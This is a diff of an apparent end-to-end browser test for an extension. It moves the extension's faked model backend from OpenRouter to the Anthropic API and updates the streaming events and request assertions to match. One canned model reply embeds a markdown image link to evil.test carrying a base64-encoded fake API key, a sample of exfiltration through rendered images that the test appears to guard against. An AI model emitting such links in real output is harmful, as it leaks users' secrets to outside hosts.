@@ -1,4 +1,4 @@
-// End-to-end: loads the unpacked extension in Chromium and fakes OpenRouter and
+// End-to-end: loads the unpacked extension in Chromium and fakes the Anthropic API and
 // the Figma API. Walks: squad dock → drag a pet onto a text field → approve a
 // rewrite; drag onto an image (screenshot goes to the model); lasso a paragraph
 // → click a pet; search bar; a fake Figma file → approve & post a comment;
@@ -38,12 +38,12 @@ const PNG_1PX = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUl
 
   // ---- fakes
   const calls = [];
-  await ctx.route("https://openrouter.ai/**", async (route) => {
+  await ctx.route("https://api.anthropic.com/**", async (route) => {
     const body = JSON.parse(route.request().postData());
     calls.push(body);
     await sleep(1200); // so the loading state is visible
-    const sys = body.messages[0].content;
-    const user = JSON.stringify(body.messages[1].content);
+    const sys = body.system;
+    const user = JSON.stringify(body.messages[0].content);
     const text = /OUTPUT-CHECK/.test(user) ? "Here is the summary. ![chart](https://evil.test/p.png?d=c2stb3ItdjEtc2VjcmV0LWtleS1oZXJl)"
       : /=== ANSWERS ===/.test(user)
       ? Array.from({ length: 4 }, (_, i) => `${i + 1}. Question ${i + 1}: what does the note say about point ${i + 1}?\n   (Think about who owns it, when it happens, and why it matters for the beta.)`).join("\n\n") +
@@ -52,8 +52,13 @@ const PNG_1PX = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUl
       : /replace the original text/.test(sys) ? "This sentence has some mistakes in it and needs fixing."
       : /posted as a comment/.test(sys) ? "Primary button label is vague; say “Pay $42” instead of “Continue”."
       : "## Summary\n- **Beta** ships *Friday 14 Nov*\n- Maya: release notes; Sam: `login` bug\n\n| Who | What |\n|---|---|\n| Maya | notes |\n\n- [ ] Design review next week";
-    const chunk = (delta, finish) => `data: ${JSON.stringify({ choices: [{ index: 0, delta, finish_reason: finish || null }] })}\n\n`;
-    await route.fulfill({ status: 200, headers: { "content-type": "text/event-stream" }, body: ": OPENROUTER PROCESSING\n\n" + chunk({ content: text.slice(0, 15) }) + chunk({ content: text.slice(15) }) + chunk({}, "stop") + "data: [DONE]\n\n" });
+    // Messages API streaming events (server-sent events).
+    const ev = (o) => `event: ${o.type}\ndata: ${JSON.stringify(o)}\n\n`;
+    const delta = (t) => ev({ type: "content_block_delta", index: 0, delta: { type: "text_delta", text: t } });
+    await route.fulfill({ status: 200, headers: { "content-type": "text/event-stream" }, body:
+      ev({ type: "message_start", message: { id: "msg_e2e", type: "message", role: "assistant", model: body.model, content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 10, output_tokens: 0 } } }) +
+      ev({ type: "content_block_start", index: 0, content_block: { type: "text", text: "" } }) + delta(text.slice(0, 15)) + delta(text.slice(15)) +
+      ev({ type: "content_block_stop", index: 0 }) + ev({ type: "message_delta", delta: { stop_reason: "end_turn", stop_sequence: null }, usage: { output_tokens: 20 } }) + ev({ type: "message_stop" }) });
   });
   let figmaComment = null;
   await ctx.route("https://www.figma.com/**", (route) => route.fulfill({ status: 200, headers: { "content-type": "text/html" }, body: FIGMA_PAGE }));
@@ -69,7 +74,7 @@ const PNG_1PX = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUl
   });
   await ctx.route("https://figma-render.test/**", (route) => route.fulfill({ status: 200, contentType: "image/png", body: PNG_1PX }));
 
-  await sw.evaluate(() => chrome.storage.local.set({ apiKey: "sk-or-v1-test", figmaToken: "figd_test" }));
+  await sw.evaluate(() => chrome.storage.local.set({ anthropicKey: "sk-ant-test", figmaToken: "figd_test" }));
   const page = await ctx.newPage();
   await page.goto("http://localhost:8765/");
   await sleep(600);
@@ -121,7 +126,7 @@ const PNG_1PX = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUl
   await page.getByRole("button", { name: "Describe image" }).click();
   await sleep(1800);
   const imgCall = calls.at(-1);
-  assert.ok(imgCall.messages[1].content.some((p) => p.type === "image_url" && p.image_url.url.startsWith("data:image/jpeg")), "image sent");
+  assert.ok(imgCall.messages[0].content.some((p) => p.type === "image" && p.source.type === "base64" && p.source.media_type === "image/jpeg"), "image sent");
   await page.getByRole("button", { name: "Close", exact: true }).first().click();
   console.log("✓ drag Pixel → image → screenshot goes to the model");
 
@@ -143,7 +148,7 @@ const PNG_1PX = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUl
   await page.getByRole("button", { name: "Summarize" }).click();
   await sleep(1800);
   const lassoCall = calls.at(-1);
-  assert.match(lassoCall.messages[1].content[0].text, /Maya owns the release notes/);
+  assert.match(lassoCall.messages[0].content[0].text, /Maya owns the release notes/);
   await shot(page, "8-summary");
   // Markdown is rendered as real elements, never as raw syntax
   const md = page.locator(".result .out");
@@ -190,7 +195,7 @@ const PNG_1PX = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUl
   await page.getByRole("textbox", { name: "Ask a follow-up about this spot" }).fill("make it shorter");
   await page.keyboard.press("Enter");
   await sleep(1800);
-  assert.match(calls.at(-1).messages[1].content[0].text, /Earlier answers about this same content[\s\S]*Summary[\s\S]*make it shorter/);
+  assert.match(calls.at(-1).messages[0].content[0].text, /Earlier answers about this same content[\s\S]*Summary[\s\S]*make it shorter/);
   assert.equal((await sw.evaluate(() => chrome.storage.local.get("history"))).history[0].skillName, "Follow-up: make it shorter");
   await page.keyboard.press("Escape");
   // reload: the pin comes back at the same spot
@@ -425,7 +430,7 @@ const PNG_1PX = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUl
   await shot(page, "9f-alt1-card");
   await page.keyboard.press("Digit1");
   await sleep(1700);
-  assert.match(calls.at(-1).messages[1].content.at(-1).text ?? calls.at(-1).messages[1].content[0].text, /Skill:/);
+  assert.match(calls.at(-1).messages[0].content.at(-1).text ?? calls.at(-1).messages[0].content[0].text, /Skill:/);
   await page.keyboard.press("Escape");
   await page.mouse.click(900, 40);
   // Alt+drag a box anywhere, then "2" → Quill on the pick
@@ -573,7 +578,7 @@ const PNG_1PX = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUl
   assert.deepEqual(figmaComment.body.client_meta, { node_id: "12:34", node_offset: { x: 24, y: 24 } });
   assert.match(figmaComment.body.message, /Pay \$42/);
   const figCall = calls.at(-1);
-  assert.match(figCall.messages[1].content[0].text, /Continue/, "frame text layers from the Figma API");
+  assert.match(figCall.messages[0].content[0].text, /Continue/, "frame text layers from the Figma API");
   await fig.screenshot({ path: SS + "13-figma-posted.png" });
   await fig.keyboard.press("Escape");
   await sleep(200);
